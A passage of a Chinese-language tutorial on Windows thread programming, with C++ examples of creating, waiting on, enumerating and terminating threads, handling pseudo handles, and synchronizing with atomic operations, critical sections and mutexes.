class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是子线程,%s\n&quot;</span>, lpThreadParameter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15PB&quot;</span>,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 循环</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是主线程\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程信号"><a href="#线程信号" class="headerlink" title="线程信号"></a>线程信号</h2><p>WaitForSingleObject(hThread,-1 ); //该函数表示信号，参数一为被创建的线程名，参数二为一直等到有信号的状态，意思是等待被创建线程结束</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_关于线程的信号.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (n&lt;<span class="number">100000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n);</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15PB&quot;</span>,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="comment">//2 等到线程结束</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(</span><br><span class="line">hThread,</span><br><span class="line"><span class="number">-1</span>      <span class="comment">//一直等到有信号的状态</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程遍历"><a href="#线程遍历" class="headerlink" title="线程遍历"></a>线程遍历</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">VOID <span class="title">ListProcessThreads</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line">THREADENTRY32 te32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建快照</span></span><br><span class="line">hThreadSnap =               <span class="comment">//参数一为一个线程的宏，遍历进程就写进程的宏，模块就写模块的宏</span></span><br><span class="line"><span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 设置输入参数，结构的大小</span></span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line"><span class="comment">// 开始获取信息</span></span><br><span class="line"><span class="built_in">Thread32First</span>(hThreadSnap, &amp;te32);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程ID:%d\n&quot;</span>, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//1. 打开线程，得到句柄</span></span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//2. 暂停</span></span><br><span class="line"><span class="comment">//SuspendThread(hThread);</span></span><br><span class="line"><span class="comment">//ResumeThread(hThread);</span></span><br><span class="line"><span class="built_in">TerminateThread</span>(hThread, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示相关信息</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te32));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">ListProcessThreads</span>(<span class="number">4068</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="理解伪句柄"><a href="#理解伪句柄" class="headerlink" title="理解伪句柄"></a>理解伪句柄</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 得到句柄</span></span><br><span class="line">HANDLE hThread = (HANDLE)lpThreadParameter;</span><br><span class="line"><span class="comment">//2 获取创建时间</span></span><br><span class="line">FILETIME stcCreationTime, stcExitTime;</span><br><span class="line">FILETIME stcKernelTime, stcUserTime;</span><br><span class="line"><span class="built_in">GetThreadTimes</span>(hThread, &amp;stcCreationTime,</span><br><span class="line">&amp;stcExitTime, &amp;stcKernelTime, &amp;stcUserTime);</span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line"><span class="built_in">FileTimeToLocalFileTime</span>(&amp;stcCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line"><span class="built_in">FileTimeToSystemTime</span>(&amp;fi, &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取当前线程句柄</span></span><br><span class="line">HANDLE hThread = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">HANDLE hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line"><span class="comment">//2 获取当前线程的创建时间</span></span><br><span class="line">FILETIME stcCreationTime, stcExitTime;</span><br><span class="line">FILETIME stcKernelTime, stcUserTime;</span><br><span class="line"><span class="built_in">GetThreadTimes</span>(hThread, &amp;stcCreationTime,</span><br><span class="line">&amp;stcExitTime, &amp;stcKernelTime, &amp;stcUserTime);</span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line"><span class="built_in">FileTimeToLocalFileTime</span>(&amp;stcCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line"><span class="built_in">FileTimeToSystemTime</span>(&amp;fi, &amp;st);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">//2.X 将伪句柄变成一个真句柄</span></span><br><span class="line">HANDLE hThreadParent = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">DuplicateHandle</span>(</span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(), <span class="comment">// 拥有源句柄的进程句柄</span></span><br><span class="line"><span class="built_in">GetCurrentThread</span>(),  <span class="comment">// 指定对象的现有句柄(伪句柄)</span></span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(), <span class="comment">// 拥有新对象句柄的进程句柄</span></span><br><span class="line">&amp;hThreadParent,      <span class="comment">// 用于保存新句柄</span></span><br><span class="line"><span class="number">0</span>,                   <span class="comment">// 安全访问级别</span></span><br><span class="line"><span class="literal">false</span>,               <span class="comment">// 是否可以被子进程继承</span></span><br><span class="line">DUPLICATE_SAME_ACCESS); <span class="comment">// 转换选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3 创建一个子线程</span></span><br><span class="line">HANDLE hChildThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)hThreadParent,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hChildThread, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hChildThread); <span class="comment">//关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadParent);<span class="comment">//关闭句柄</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取线程环境"><a href="#获取线程环境" class="headerlink" title="获取线程环境"></a>获取线程环境</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">VOID <span class="title">ListProcessThreads</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line">THREADENTRY32 te32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建快照</span></span><br><span class="line">hThreadSnap =</span><br><span class="line"><span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 设置输入参数，结构的大小</span></span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line"><span class="comment">// 开始获取信息</span></span><br><span class="line"><span class="built_in">Thread32First</span>(hThreadSnap, &amp;te32);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程ID:%d\n&quot;</span>, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//1. 打开线程，得到句柄</span></span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//2. 暂停</span></span><br><span class="line"><span class="comment">//SuspendThread(hThread);</span></span><br><span class="line"><span class="comment">//3. 获取上下文</span></span><br><span class="line">CONTEXT context = &#123; CONTEXT_ALL &#125;;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(hThread, &amp;context); </span><br><span class="line"><span class="comment">//context.;</span></span><br><span class="line"><span class="comment">//SetThreadContext(hThread, &amp;context); //获取之后，可以修改</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line"><span class="comment">//TerminateThread(hThread, 0);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示相关信息</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te32));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">ListProcessThreads</span>(<span class="number">25088</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>1 线程同步是一个什么样的问题？？？</p><p>如果你编写的是多线程程序，那么多个线程是并发执行，可以认为他们是同时在执行代码。但是线程和线程之间并非是完全的没有关系。很多时候会有以下两种关系：</p><p>第一种情况，线程A的继续执行，要以线程B完成了某一个操作之后为前提。 这种需求称之为同步</p><p>第二种情况，多个线程在争抢一个资源，比如：全局变量，可以是文件，可以是一个数据结构，可以是一个对象。 这种需求称之为同步互斥。</p><p>2 以下的这些机制怎么解决的这个问题？？各自又什么区别，分别用于什么样的场景呢？？？</p><p>a. 以下这些机制都能够比较方便的解决互斥问题。</p><h4 id="原子操作："><a href="#原子操作：" class="headerlink" title="原子操作："></a>原子操作：</h4><p> 原子操作适合去解决共享资源是全局变量的互斥问题。</p><p> 作用就是对于一个变量的基本算术运算保证是原子性的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">long</span> g_n = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">InterlockedIncrement</span>(&amp;g_n);</span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">InterlockedIncrement</span>(&amp;g_n);</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="临界区解决互斥问题："><a href="#临界区解决互斥问题：" class="headerlink" title="临界区解决互斥问题："></a>临界区解决互斥问题：</h4><p> 被保护的代码（代码访问了共享资源）放置在</p><p> EnterCriticalSection</p><p> LeaveCriticalSection 之间即可</p><p> 临界区具有线程所有权这个概念，必须进入临界区的线程，调用离开临界区，临界区才会被打开。假如加锁的线程崩溃了，其他线程就锁死了。</p><p>介绍另外3种机制前，先说两个重要概念</p><p>1：</p><p>激发态（有信号） 非激发态（没有信号）</p><p>WaitForSignaleObject(内核对象，时间)；函数的作用，当内核对象处于非激发态的时候，就阻塞住，内核对象处于激发态了，就立即返回。</p><p>2：WaitForSignaleObject的副作用，WaitForSignaleObject对于被等待的内核对象有副作用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//定义临界区结构体</span></span><br><span class="line">CRITICAL_SECTION g_cs = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始化临界区对象</span></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;g_cs);</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知道了以上两个概念后，我们看其他3个机制</p><h4 id="互斥体解决互斥问题："><a href="#互斥体解决互斥问题：" class="headerlink" title="互斥体解决互斥问题："></a>互斥体解决互斥问题：</h4><p> 被保护的代码（代码访问了共享资源）放置在</p><p> WaitForSignalObject</p><p> ReleaseMutex</p><p> 互斥体也具有线程所有权的概念，得到互斥体的线程，需要自己去释放互斥体。谁加锁，谁开锁。如果得到互斥体的线程崩溃了，互斥体会立即变为激发态。所有等待互斥体的线程中会立即有线程得到互斥体。不会造成死锁的问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 